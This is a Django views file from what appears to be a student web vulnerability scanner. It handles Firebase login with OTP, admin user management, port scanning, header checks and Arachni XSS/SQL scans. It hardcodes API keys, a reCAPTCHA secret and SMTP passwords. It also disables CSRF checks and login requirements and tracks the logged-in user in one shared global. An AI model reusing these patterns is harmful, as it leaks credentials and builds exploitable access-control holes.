from django.shortcuts import render
from subprocess import run,PIPE
import subprocess
import requests
import sys
from django.views.decorators.csrf import csrf_exempt
from django.template import RequestContext
from django.http import HttpResponse
import socket
import subprocess
import os
import pathlib
from collections import OrderedDict
import urllib
import json
import random
import time
import mechanize
import http.cookiejar as cookielib
from bs4 import BeautifulSoup
import html2text
import re
import requests 
import dropbox
from datetime import datetime, date
import lxml.html
from django.contrib.auth.decorators import login_required
from .headercheck import SecurityHeaders
from myapp.securityheaders.__main__ import cli
from myapp.arachni_tester import ArachniClient
from urllib.parse import urlparse
import urllib.request
from urllib import parse
from django.shortcuts import render, redirect
from django.contrib.auth import (
    authenticate,
    get_user_model,
    login,
    logout
)
from django.contrib.auth.models import User
from .forms import UserLoginForm, UserRegisterForm
import pyrebase 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email.mime.image import MIMEImage
from email import encoders
from myapp.emailer import thisonetrust
import firebase_admin
from firebase_admin import credentials
from firebase_admin import auth as auth2
from myapp.pdf_generator import pdf_generator
from myapp.otpyer import qrcodeGenerator, validation

config={
    "apiKey": "AIzaSyARTOEGZOikzGrk6f0jSkhCiXBx2FAKg78",
    "authDomain": "fyptheboyes.firebaseapp.com",
    "databaseURL": "https://fyptheboyes.firebaseio.com",
    "projectId": "fyptheboyes",
    "storageBucket": "fyptheboyes.appspot.com",
    "messagingSenderId": "1073113067983",
    "appId": "1:1073113067983:web:7564efc27471e46f65e2ba",
    "measurementId": "G-R0SJYKDBMZ",
    
}
firebase=pyrebase.initialize_app(config)
db=firebase.database()
auth=firebase.auth()

cred=credentials.Certificate('D:/Desktop/FYP/FYP-Django/mysite/myapp/firebasesdk.json')
app=firebase_admin.initialize_app(cred, {
    "databaseURL": "https://fyptheboyes.firebaseio.com",
})

login_email_rn=""
#https://www.youtube.com/watch?v=gsW5gYTNi34
#https://codeloop.org/python-firebase-authentication-with-email-password/

def error_404_view(request,exception):
    return render(request,'404.html')

def error_505_view(request,exception):
    return render(request,'500.html')
#----------------------------------------------
def signIn(request):
 
    return render(request, "login.html")


def postsign(request):
    
    email=request.POST.get('email')
    passw=request.POST.get('pass')
    otpcode=request.POST.get('code')
    
    captcha_token=request.POST.get('g-recaptcha-response')
    captcha_url='https://www.google.com/recaptcha/api/siteverify'
    captcha_secret='6Le9FpEaAAAAAPPu0sot1fAVj4n31mharnfEdrLt'
    cap_data={"secret":captcha_secret, "response":captcha_token}
    cap_server_response=requests.post(url=captcha_url, data=cap_data)
    cap_json=json.loads(cap_server_response.text)
    print(cap_json)
    try:
        user = authenticate(request,username=email, password=passw)
        check_email = auth2.get_user_by_email(email)
        
        user_check_fb=auth.sign_in_with_email_and_password(email,passw)
        usercheckfb = auth.get_account_info(user_check_fb['idToken'])
        usercheckjson=json.dumps(usercheckfb['users'])
        userjsonload=json.loads(usercheckjson)
    except:
        message="Invalid login details. Try again."
        return render(request,"login.html", {"msgg":message}) 
   
  
    if user is not None and check_email.uid is not None and otpcode is not None:
        
        if cap_json['success']==False:
            message="Invalid captcha, try again!"
            return render(request,"login.html", {"msgg":message})
            
        elif check_email.email_verified == False:
            message="Please verify your email before login!"
            return render(request,"login.html", {"msgg":message})

        else:
            
            if otpcode is not None:
                secret=db.child(email.replace(".","_")).child("secret").get()
                print(secret.val())
                
                otp_check=validation(secret.val(), otpcode)
                print("printing otp check")
                print(otp_check)
                if otp_check == True:
                    #login the user and save session :D
                    login(request, user)
                    
                    # ----------------------------------------
                    now = datetime.now()
                    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
                    email_address = email    # add email address here
                    Subject = 'Did you log in?\n\n'
                    content = 'Hi there, we detected a login from your account on '+dt_string+'. If this is not you kindly contact us ASAP and we will assist you.\n\n' 
                    footer = '- TheBoyes Administrator'    # add test footer 
                    passcode = 'blfmslewrtijnfqn'        # add passcode here
                    conn = smtplib.SMTP_SSL('smtp.mail.yahoo.com', 465) 
                    conn.ehlo()
                    conn.login('fypemail@yahoo.com', passcode)
                    conn.sendmail('fypemail@yahoo.com',email_address,Subject + content + footer)
                    conn.quit()
                    global login_email_rn
                    login_email_rn=str(email)
                    # -----------------------------------------------------
                    return render(request,"pick.html",{"firebasename":check_email.display_name}) 

                else:
                    message="OTP invalid!"
                    return render(request,"login.html", {"msgg":message}) 
            else:
                message="Please key in OTP!"
                return render(request,"login.html", {"msgg":message})   
    else:
        message="Invalid login details. Try again."
        return render(request,"login.html", {"msgg":message}) 
    
#-----UP IS WORKING---------------------
    # try:
    #     user=auth.sign_in_with_email_and_password(email,passw)
    #     print("The user"+user)
    #     usercheck = auth.get_account_info(user['idToken'])
    #     usercheckjson=json.dumps(usercheck['users'])
    #     userjsonload=json.loads(usercheckjson)
    #     login(request, user)                
    #     if userjsonload[0]['emailVerified'] == False:
    #         message="Please verify your email before login!"
    #         return render(request,"login.html", {"msgg":message})
        
        
    #     elif cap_json['success']==False:
    #         login(request, user)
    #         message="Invalid captcha, try again!"
    #         return render(request,"login.html", {"msgg":message})
        
    # except:
    #     message="There was a problem. Try again."
    #     return render(request,"login.html", {"msgg":message})  
  
    #----------------------------------------
    # now = datetime.now()
    # dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    # email_address = email    # add email address here
    # Subject = 'Did you log in?\n\n'
    # content = 'Hi there, we detected a login from your account on '+dt_string+'. If this is not you kindly contact us ASAP and we will assist you.\n\n' 
    # footer = '- TheBoyes Administrator'    # add test footer 
    # passcode = 'blfmslewrtijnfqn'        # add passcode here
    # conn = smtplib.SMTP_SSL('smtp.mail.yahoo.com', 465) 
    # conn.ehlo()
    # conn.login('fypemail@yahoo.com', passcode)
    # conn.sendmail('fypemail@yahoo.com',email_address,Subject + content + footer)
    # conn.quit()
    # global login_email_rn
    # login_email_rn=str(email)
    #-----------------------------------------------------
    # Reset password
    #auth.send_password_reset_email(email)

    
    # session_id=user['idToken'] 

    # request.session['uid']=str(session_id) 
    # return render(request,"pick.html") 

#----------------------------------------------
#CHECK THIS IF WORK!! ADMIN fypemail yahoo pass is password, regitration is not working, login required
# #@login_required(login_url='/admin_log_in/')
def postregister(request):
    regem=request.POST.get('reg_email')
    regpass=request.POST.get('reg_password')

    if User.objects.filter(username=regem).exists():
        message="User Exists!"

        return render(request,'userreg.html', {"msgg":message})
    else:

        saveuser=User.objects.create_user(username=regem,password=regpass)
        saveuser.save()
        user=auth.create_user_with_email_and_password(regem, regpass)

        signin = auth.sign_in_with_email_and_password(regem, regpass)
        auth.send_email_verification(signin['idToken'])
        
        message="Email Verification Has Been Sent"

        #saving otp secret to firebase
        secretcode=qrcodeGenerator(regem)
        #==========QR CODE SEND TO EMAIL=======
        
        msg = MIMEMultipart()
        attachment ='D:/Desktop/FYP/FYP-Django/mysite/myapp/QRcodes/otp.png' 
        msg['Subject'] = 'Your QR Code - TheBoyes Web Scanner'
        msg['From'] = 'fypemail@yahoo.com' #change this to email used by us
        msg['To'] = regem #change this to email input from user
        # Add body to email
        msgText = MIMEText('<b>Hi there!</b><br><p>Please scan the QR code attached with this email with Google Authenticator to be able to get your code during login</p><br><p>Google Authenticator for Android:<a>https://play.google.com/store/apps/details?id=com.google.android.apps.authenticator2</a></p><br><p>Google Authenticator for iOS:<a>https://apps.apple.com/us/app/google-authenticator/id388497605</a></p><img src="cid:attachment">', 'html')  
        msg.attach(msgText)   # Added, and edited the previous line
       
        fp = open(attachment, 'rb')                                                    
        img = MIMEImage(fp.read())
        fp.close()
        img.add_header('Content-ID', '<{}>'.format(attachment))
        msg.attach(img)

        # Create SMTP object
        session = smtplib.SMTP('smtp.mail.yahoo.com', 587)
        session.starttls() #enable security
        # Login to the server
        session.login('fypemail@yahoo.com', 'driqnfsefylmmlwq')

        # Convert the message to a string and send it
        session.sendmail(msg['From'], msg['To'], msg.as_string())
   
        print("Mail sent")


        #========================================
        print(secretcode)
        secret_to_firebase = db.child(regem.replace(".","_")).child("secret")
        secret_to_firebase.set(secretcode)
        return render(request,'userreg.html', {"msgg":message})


def logout_view(request):
    global login_email_rn
    login_email_rn=""
    logout(request)
    return redirect('/')

# @login_required
def home(request):
    print(login_email_rn)
    check_email = auth2.get_user_by_email(login_email_rn)
    return render(request,'pick.html',{"firebasename":check_email.display_name})
    
#put three button, disable done, noe enable and delete
def del_disble_user(request):
    email_to_disable=request.POST.get('disble_user_button')
    email_to_delete=request.POST.get('del_user_button')
    print(email_to_delete)
    print(email_to_disable)
    if email_to_disable is not None:
        u=User.objects.get(username=email_to_disable)

        print(u.is_active)
        if u.is_active == False:
            u.is_active = True
            u.save()
            
            print(email_to_disable)
        
            user = auth2.get_user_by_email(email_to_disable)
            user_update=auth2.update_user(user.uid, disabled=False)
        
        else:
            u.is_active = True
            u.is_active = False
            u.save()
        
            print(email_to_disable)
    
            user = auth2.get_user_by_email(email_to_disable)
            user_update=auth2.update_user(user.uid, disabled=True)
            # auth2.delete_user(user.uid)
            
        print("User disabled/enabled!")
    
    elif email_to_delete is not None:
        try:
            u=User.objects.get(username=email_to_delete)
            u.username = "delete"+datetime.today().strftime('%d%m%Y%H%M%S')
            u.save()
        except User.DoesNotExist:
            messages.error(request, "User doesnot exist")  
        user = auth2.get_user_by_email(email_to_delete)
        auth2.delete_user(user.uid)
         
     
        print("User gone!")


    return admin_custom(request)

def admin_custom(request):
    g=[]
    ver=""
    disabled=""
    today=datetime.today().strftime('%d-%m-%Y')
    
    page = auth2.list_users()
    while page:
        for user in page.users:
            # print('User: ' + user)
            if user.email_verified == True:
                ver="Verified"
            else:
                ver="Not Verified"
            usermeta=auth2.get_user(user.uid)
            disbled=user.disabled
            if disbled==False:
                disabled="Active"
            else:
                disabled="Disabled"
            createtime=usermeta.user_metadata.creation_timestamp
            lastlogin=usermeta.user_metadata.last_sign_in_timestamp
            formtd_time_create=time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(createtime/1000.0))
            formtd_time_lastlogin=time.strftime('%d-%m-%Y %H:%M:%S', time.localtime(lastlogin/1000.0))
            #change to disable/enable..and add the delete button

            #^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
            disable_button='<button type="submit" class="btn btn-primary" name="disble_user_button" value={0}>Enable/Disable</button>'.format(user.email)
            delete_button='<button type="submit" class="btn btn-primary" name="del_user_button" value={0}>Delete</button>'.format(user.email)

            g.append([user.email,ver,disabled,formtd_time_create,formtd_time_lastlogin,disable_button,delete_button])
        
        page = page.get_next_page()
    
    return render(request,'template.html', {"extractuser":list(g),"today":today})
    
def scan_history(request):

    history=[]
    scan_date=[]
    
    emel=login_email_rn.replace(".","_")
    print(emel)
    
    extract_scan_history = db.child(emel).child("scans").get()
    print("printing random stuff")
    print(extract_scan_history)
    
    for scanned in extract_scan_history:
        print(scanned.key())
        keys=scanned.key()
        web_extract=keys.replace("_",".")
        strip_character="."
        print(web_extract)
        url_extract=web_extract[:-15]
        # datee=strip_character.join(web_extract.split(strip_character)[2:])
        dateee=web_extract[-14:]
        print(url_extract)
        date_formatted=datetime.strptime(dateee, '%d%m%Y%H%M%S')
    
        history.append(url_extract)
        scan_date.append(date_formatted)
        ziplist=zip(history, scan_date)
        
        dload_button='<button type="submit" class="btn btn-primary" name="dload_scan" value={0}>Download</button>'.format(url_extract)
    return render(request,'scan_history.html', {"scanHistory":ziplist,"dload_button":dload_button})

# #@login_required(login_url='/admin_log_in/')
def admin_reg(request):
    return render(request,'userreg.html')

def logup(request):
    scan_log=[]
    emel="fypemail@yahoo.com".replace(".","_")
    print(emel)
    #  secret=db.child(email.replace(".","_")).child("secret").get()
    extract_scan_log= db.child(emel).child("logging").get()
    for i in extract_scan_log:
        scan_log.append(i)
    return render(request, 'logging_update.html', {'logup': scan_log})

def admin_login(request):
    
    return render(request,'admin_login.html')

def admin_process_log(request):
    adm_mail=request.POST.get('admin_uname')
    adm_password=request.POST.get('admin_pass')
   
    if str(adm_mail) == 'fypemail@yahoo.com':
       
        try:
            user=auth.sign_in_with_email_and_password(adm_mail, adm_password)
        except:
            message="Check input! Try again."
            return render(request,"admin_login.html", {"msgg":message})
    else:
        message="Not an admin! Try again."
        return render(request,"admin_login.html", {"msgg":message})
    return redirect('admin_custom')

def logout_admin(request):
    logout(request)
    return redirect('/admin-login/')
    


# #@login_required
@csrf_exempt
def report(request):
  
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]
    emel=login_email_rn.replace(".","_")
    extract = db.child(emel).child("scans").child(thewebsite).get()

    for x in extract.each():

        keys.append(x.key())
        descr.append(x.val()['description'])
        remedy.append(x.val()['remedy'])
        url_issue.append(x.val()['url_issue'])
  
    
    return render(request,'report.html',{"keysNvalue":zip(keys,descr,remedy,url_issue)})

# @login_required
def normal(request):
    return render(request,'normal.html')    

#@login_required
def fullscan_arachni(request):
    return render(request,'fullarachni.html') 

#@login_required
def fullscan_arachni_auth(request):
    return render(request,'fullarachni_auth.html') 

#@login_required
def index(request):
    return render(request,'index.html')

#@login_required
@csrf_exempt
def external(request):

    remoteServer    = request.POST.get('param')
    remoteServerIP  = socket.gethostbyname(remoteServer)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",remoteServer , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+remoteServer)
    data=ip_locate.read()
    values=json.loads(data)
    val=values['lat']
    val2=values['lon']


    b=len(fixed_list)/31
    c=b*100
    #----------------------------------------------
    
    foo = SecurityHeaders()

    parsed = urlparse(remoteServer)
    if not parsed.scheme:
        url = 'https://' + remoteServer # default to http if scheme not provided


    headers = foo.check_headers(url)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
    # -------------------------------------------
    cli(url)
    
    # urlscraper(url)
                            
    visited_links  = set()
    # Cookie Jar

    cj=cookielib.LWPCookieJar()
    def visit(br, url):
        br.open(url)
        br._factory.is_html = True
        links = br.links()
        for link in links:
            if not link.url in links:
                visited_links.add(link.url)  

    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_cookiejar(cj)
    
    br.set_handle_equiv(True)
    br.set_handle_gzip(True)
    br.set_handle_redirect(True)
    br.set_handle_referer(True)
    br.set_handle_robots(False)
    #br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    thelink='http://'+remoteServer
    br.open(thelink)
    
    # Select the second (index one) form (the first form is a search query box)
    for f in br.forms():
        print (f)

    br.select_form(nr=0)

    # User credentials

    br.form[request.POST.get('form_cred_user')] = request.POST.get('userInp')
    br.form[request.POST.get('form_cred_pass')] = request.POST.get('passInp')
    
    br.submit()
    
    br.set_cookiejar(cj)
    print(cj)

    visit(br,thelink)
    bar=visited_links.copy()
    for e in bar:
        visit(br,e)
    
    print(list(visited_links))
    
        # -------------------------------------------------------------------
    a=render(request, 'index.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links), 'data6':cj})
    
    #sending to firebase
    to_firebase={"ip":remoteServer,"port_open":fixed_list, "ip_info":values, "links_found":list(visited_links),"head_found":headers}
    db.child(login_email_rn.replace(".","_")).child(remoteServer.replace(".","_")).set(to_firebase)
    pdf_generator(re.sub('[.:/]','_',url),app)
    return a
    


#@login_required
@csrf_exempt
def norm_scan(request):
    
    remoteServer    = request.POST.get('param')
    remoteServerIP  = socket.gethostbyname(remoteServer)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.8)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",remoteServer , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+remoteServer)
    data=ip_locate.read()
    values=json.loads(data)
    val=values['lat']
    val2=values['lon']


    b=len(fixed_list)/31
    c=b*100
    #----------------------------------------------
    
    foo = SecurityHeaders()

    parsed = urlparse(remoteServer)
    if not parsed.scheme:
        url = 'https://' + remoteServer # default to http if scheme not provided


    headers = foo.check_headers(url)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
    # -------------------------------------------
    cli(url)
    
    # urlscraper(url)
                            
    visited_links  = set()
    # Cookie Jar

    cj=cookielib.LWPCookieJar()
    def visit(br, url):
        br.open(url)
        br._factory.is_html = True
        links = br.links()
        for link in links:
            if not link.url in links:
                visited_links.add(link.url)  

    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    # br.set_cookiejar(cj)
    
    # br.set_handle_equiv(True)
    # br.set_handle_gzip(True)
    # br.set_handle_redirect(True)
    # br.set_handle_referer(True)
    # br.set_handle_robots(False)
   
    br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
    thelink=remoteServer
    # br.open(thelink)
    
       
    # br.set_cookiejar(cj)
    print("The email bosku")
    print(login_email_rn)

    # visit(br,thelink)
    # bar=visited_links.copy()
    # for e in bar:
    #     visit(br,e)
    
    print(list(visited_links))
    
        # -------------------------------------------------------------------
 

    # a=render(request, 'report.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links), 'data6':cj,"keysNvalue":zip(keys,descr,remedy,url_issue)})
    now_today=datetime.now().strftime("%d%m%Y%H%M%S")
    print(now_today)
    url_tofirebase=remoteServer.replace(".","_")+"_"+now_today
    emailtofirebase=login_email_rn.replace(".","_")
    #sending to firebase
    to_firebase={"ip":remoteServer,"port_open":fixed_list, "ip_info":values, "links_found":list(visited_links),"head_found":headers}
    db.child(emailtofirebase).child("scans").child(url_tofirebase).set(to_firebase)
    time.sleep(10)
    pdf_generator(url_tofirebase,login_email_rn,re.sub('[.:/]','_',remoteServer),app)
    return render(request, 'report.html',{'data':fixed_list,'data2':c,'data3':val,'data4':val2, 'data5':list(visited_links), 'data6':cj})
  


#@login_required
@csrf_exempt    
def arachni (request):
    
    url = request.POST.get('param')
    email=request.POST.get('userinputemail')

    url_inp=""
    try:
               
        urller = re.compile(r"https?://(www\.)?")
        new=urller.sub('', url).strip().strip('/')
        split_string = new.split("/", 1)
        url_inp = split_string[0]
    except:
        pass
    print(url_inp)
    
    # split_url = parse.urlsplit(url_inp)
    # remoteServerIP = socket.gethostbyname(split_url.netloc)
    remoteServerIP  = socket.gethostbyname(url_inp)
    print(remoteServerIP)
    com_port = [20, 21, 22, 23, 25, 50, 51, 53, 67, 68, 69, 80, 110, 119, 123, 135,136, 137, 138, 139, 143, 161, 162, 179, 389, 443, 636, 989, 990, 993, 1812]
    portOpenList = []
    portCloseList = []
    #out=run([sys.executable, 'D://Desktop//quanta//QuantaDjango//quanta_Scanner//mysite//myapp//tester.py',inp], shell=False)
    try:
        for port in com_port:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((remoteServerIP, port))
            if result == 0:
                portOpenList.append(port)
                print("Port {}: 	 Open".format(port))

            else:
                portCloseList.append(port)
                print("Port {}:          Closed".format(port))
            sock.close()

    except KeyboardInterrupt:
        print("Keyboard Interrupt")
    fixed_list=str(portOpenList)[1:-1]
 
    print ("ip: ",url , "portsOpen: ", fixed_list)
    
    ip_locate=urllib.request.urlopen("http://ip-api.com/json/"+url_inp)
    data=ip_locate.read()
    values=json.loads(data)
    print(values)
    #----------------------------------------------
     #sending to firebase
    

    foo = SecurityHeaders()

    parsed = urlparse(url)
    if not parsed.scheme:
        url = 'http://' + url # defasult to http if scheme not provided


    headers = foo.check_headers(url)

    if not headers:
        print ("Failed to fetch headers, exiting...")
        sys.exit(1)

    okColor = '\033[92m'
    warnColor = '\033[93m'
    endColor = '\033[0m'
    
    for header, value in headers.items():
        if value['warn'] == 1:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + warnColor + 'WARN' + endColor + ' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + warnColor + 'WARN' + endColor + ' ]')
        elif value['warn'] == 0:
            if value['defined'] == False:
                print('Header \'' + header + '\' is missing ... [ ' + okColor + 'OK' + endColor +' ]')
            else:
                print('Header \'' + header + '\' contains value \'' + value['contents'] + '\'' + \
                    ' ... [ ' + okColor + 'OK' + endColor + ' ]')

    https = foo.test_https(url)
    if https['supported']:
        print('HTTPS supported ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS supported ... [ ' + warnColor + 'FAIL' + endColor + ' ]')

    if https['certvalid']:
        print('HTTPS valid certificate ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTPS valid certificate ... [ ' + warnColor + 'FAIL' + endColor + ' ]')


    if foo.test_http_to_https(url, 5):
        print('HTTP -> HTTPS redirect ... [ ' + okColor + 'OK' + endColor + ' ]')
    else:
        print('HTTP -> HTTPS redirect ... [ ' + warnColor + 'FAIL' + endColor + ' ]')
    
   
    

    if not re.match('(?:http|https)://', url):
        url='https://{}'.format(url)
    else:
        pass
    
    print(url)
    p=subprocess.Popen([r'D:\Desktop\FYP\FYP-Django\mysite\myapp\arachni-1.5.1-0.5.12-windows-x86_64\bin\arachni_rest_server.bat'])
    time.sleep(20)
    a = ArachniClient()
    resumeFlag = False
    authFlag = False
    scanType = ""
    
    #checks for existing scans and resumes from there instead
    avail_scan_object = a.get_scans() #returns json object of available scans
    print(a.get_scans()) #displays available scans | testing only

    for x in avail_scan_object: #check if avail scan is ongoing
        status_object = a.get_status(x)
        if(status_object["busy"] == True): #break and resume last scan if scan is still ongoing
            scan_ID = x
            resumeFlag = True
            start_time = time.time()
            break
    
    if(resumeFlag == False):
      
        checkAuth="n"
        while checkAuth not in ("y","n"):
            print("Invalid input")
          
            checkAuth = input("Do you want to perform an Authenticated Scan? (y/n): ")

    #select scan type here then ask if user would like to use authenticated scanning

    #start new scan if there are no ongoing ones
    if(resumeFlag == False and checkAuth == "n"):
        print("Normal scan")

        checkNormalScanType = int(request.POST.get("scanType"))

        while checkNormalScanType not in [1,2,3,4]:
            print("Invalid input")
         
            checkNormalScanType = input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: ")
        scanType = a.selectNormalScan(checkNormalScanType)
        print(scanType)
        try:
            a.target(url)
            scan_json_object = a.start_scan() #outputs json dictionary
            scan_ID = scan_json_object["id"]
            start_time = time.time()
        except Exception as e:
            print(e)

    #start auth scan if user chose yes
    elif(resumeFlag == False and checkAuth == "y"):
        authFlag = True
        checkAuthScanType = int(input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: "))
        while checkAuthScanType not in [1,2,3,4]:
            print("Invalid input")
           
            checkAuthScanType = input("Please select a scan type [1 - full audit, 2 - xss, 3 - sql, 4 - server]: ")
        print("Authenticated scan")
        scanType = a.selectAuthScan(checkAuthScanType)
        scan_json_object = a.start_scan() #outputs json dictionary
        scan_ID = scan_json_object["id"]
        start_time = time.time()

    print("passes")
    scanflag=True
    while scanflag is True:
    
        print("Resumed scan? | ", resumeFlag)
        print("Authenticated? | ", authFlag)
        print("The scan is ongoing...")
        
        status_object = a.get_status(scan_ID)
        print("Current page is: ", status_object["statistics"]["current_page"])
        print("Total audited pages are: ", status_object["statistics"]["audited_pages"])
        print("Total found pages are: ", status_object["statistics"]["found_pages"])
        print("Elapsed time is: ", status_object["statistics"]["runtime"])
        print("Current status is: ", status_object["status"])
        print("Current busy flag is: ", status_object["busy"])

        if(status_object["busy"] == False):
            print("Total scan time: ", status_object["statistics"]["runtime"])
            print("Scan has been completed, retrieving report...")
            a.getScanReport(scan_ID,"json") #output to json for database processing
            a.getScanReport(scan_ID,"html") #output to html for user ease of interaction
            # a.processJSON(scan_ID) #print out choice information
            scanflag=False
        
            time.sleep(10)
            fixed_scan_Id=scan_ID[:20]
            a.delete_scan(scan_ID)
            print("testpass")
            

            
            
            tofirebase={"ip":url_inp,"port_open":fixed_list, "ip_info":values, "head_found":headers}
           
            emailtofirebase=login_email_rn.replace(".","_")

            now_today=datetime.now().strftime("%d%m%Y%H%M%S")
           
            url_tofirebase=url_inp.replace(".","_")+"_"+now_today
          
            print(url_tofirebase)
            db.child(emailtofirebase).child("scans").child(url_tofirebase).set(tofirebase) 
            
            
            try:
                with open("myapp/reports/"+fixed_scan_Id+ ".json", encoding="utf-8") as jsonfile:
                    json_obj = json.load(jsonfile)
                    print(json_obj['issues'])
                    try:
                        if json_obj['issues'] !=[]:
                            for x in json_obj['issues']:
                                
                                if x['name']=="Interesting response":
                                    to_firebase={"issues":x['name'],"description":x['description']}
                                    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").child(x['name']).set(to_firebase)
                                else:
                                    to_firebase={"issues":x['name'],"description":x['description'],"remedy":x['remedy_guidance'],"url_issue":x['vector']['url']}
                                    db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").child(x['name']).set(to_firebase)
                        
                            
                        else:
           

                            to_firebase={"issues":"None"}
                            db.child(emailtofirebase).child("scans").child(url_tofirebase).child("issues").update(to_firebase) 

                        count=0
                        if json_obj['sitemap'] is not None:
                            
                            for xy in json_obj['sitemap']: 
                                count+=1 
                                
                                nummm=str(json_obj['sitemap'][xy])   
                                to_f={count:xy}                    
                                db.child(emailtofirebase).child("scans").child(url_tofirebase).child("sitemap").update(to_f)

                    except Exception as e:
                        print(e)

            except:
                print("File not found!")
            scanflag=False
      

    #the pdf generator is here
   
    pdf_generator(url_tofirebase,login_email_rn,re.sub('[.:/]','_',url),url)
    p.kill()
    
    keys=[]
    descr=[]
    remedy=[]
    url_issue=[]
